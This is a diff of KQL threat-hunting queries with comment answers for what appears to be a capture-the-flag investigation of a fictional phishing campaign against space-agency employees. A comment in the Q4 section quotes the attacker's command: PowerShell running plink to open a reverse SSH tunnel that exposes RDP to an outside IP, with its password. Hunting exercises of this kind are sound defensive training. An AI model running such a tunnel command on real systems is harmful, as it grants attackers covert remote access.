@@ -151,9 +151,60 @@ Employees
 // reverse: https://www.youtube.com/watch?v=8fK1kA9Q-3Y
 
 // Section 2: Yeeted into space
+// Q1 - What is the domain the attackers used to compromise SASA employees interested in the International Space Summit?
 OutboundNetworkEvents
-| where url contains "summit" 
+| where url has "summit"
 | extend domain = extract(@"https?://([a-zA-Z0-9.-]+)", 1, url)
 | distinct domain
 | summarize count()by domain
 // intlspacesummit2123.info
+
+// Q2 - Which top-level domain (TLD) used by the attacker suggests evidence of foreign interference?
+OutboundNetworkEvents
+| where url contains "summit" or url contains "international" or url contains "space"
+| extend domain = extract(@"https?://(?:www\.)?([^/]+)", 1, url)  
+| extend tld = extract(@"\.([a-zA-Z]+)$", 1, domain)
+| summarize count() by tld
+// .lu
+
+// Extra look
+OutboundNetworkEvents
+| where url contains "summit" or url contains "international" or url contains "space"
+| where url contains ".lu"
+| extend domain = extract(@"https?://([a-zA-Z0-9.-]+)", 1, url)
+| distinct domain
+| summarize count()by domain
+
+// Q3 - What was the most common file (name) that victims downloaded from the attacker domains in Q2?
+let potential_filenames=
+OutboundNetworkEvents
+| where url contains "summit" or url contains "international" or url contains "space"
+| extend filename = extract(@"([^\/]+)$", 1, url)
+| distinct filename;
+FileCreationEvents
+| where filename in (potential_filenames)
+| summarize count()by filename
+// Note: magic number between 15-16
+
+// Q4 - Right after the victims downloaded the files from Q3, the attackers ran a command to connect to their infrastructure. What is the password?
+FileCreationEvents
+| where filename == "AsteroidMiningBrief.ppt"
+// ZKV8-MACHINE - 2123-07-02T15:00:04Z
+
+ProcessEvents
+| where hostname == "ZKV8-MACHINE"
+// Looked at someoen who donaloaded the top file from before and looked at the process comandline around the same time frame.Something stuck out.
+// "powershell.exe" /c echo y | plink.exe -N -T -R 0.0.0.0:1251:127.0.0.1:3389 166.127.104.95 -P 22 -l forward -pw Aliens!:D -no-antispoof
+
+// Q5 - The attackers ran commands to discover more about their victims’ network. What is the hostname of the first victim with these commands? This includes compromised hosts that may have been impacted outside of the file in Q3. 
+ProcessEvents
+| where process_commandline has "echo y | plink.exe -N -T -R"
+// CLWS-MACHINE - 2123-07-01T15:47:50Z
+
+ProcessEvents
+| summarize count()by process_commandline
+// ipconfig /all
+
+ProcessEvents
+| where process_commandline == "ipconfig /all"
+// 2123-07-01T15:22:40Z - MBUJ-MACHINE
